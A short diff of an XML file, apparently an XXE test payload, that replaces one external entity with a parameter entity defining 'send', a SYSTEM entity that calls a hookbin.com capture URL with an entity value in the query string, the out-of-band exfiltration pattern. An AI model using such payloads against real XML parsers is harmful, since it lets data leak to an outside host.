@@ -1,6 +1,6 @@
 <?xml version="1.0"?>
 <!DOCTYPE root[
   <!ENTITY c "test">
-  <!ENTITY callhome SYSTEM "https://hookbin.com/bin/v0PP33lP?t&c;">
+  <!ENTITY % all "<!ENTITY send SYSTEM 'https://hookbin.com/bin/v0PP33lP?t%c;'>">
 ]>
 <name>&c;</name>
